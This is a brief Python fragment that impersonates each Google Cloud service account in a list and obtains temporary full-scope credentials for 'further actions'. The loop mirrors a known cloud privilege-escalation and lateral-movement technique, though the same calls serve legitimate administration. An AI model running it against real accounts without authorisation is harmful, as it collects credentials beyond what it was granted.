# Impersonate each service account and retrieve temporary credentials
for email in service_account_emails:
    try:
        target_credentials = impersonated_credentials.Credentials(credentials, target_principal=email, target_scopes=['https://www.googleapis.com/auth/cloud-platform'])
        target_credentials.refresh(Request())
        # Use the target_credentials for further actions
    except Exception as e:
        # Handle impersonation failure, e.g., log the event or trigger an alert
        print(f"Impersonation of {email} failed: {str(e)}")
```


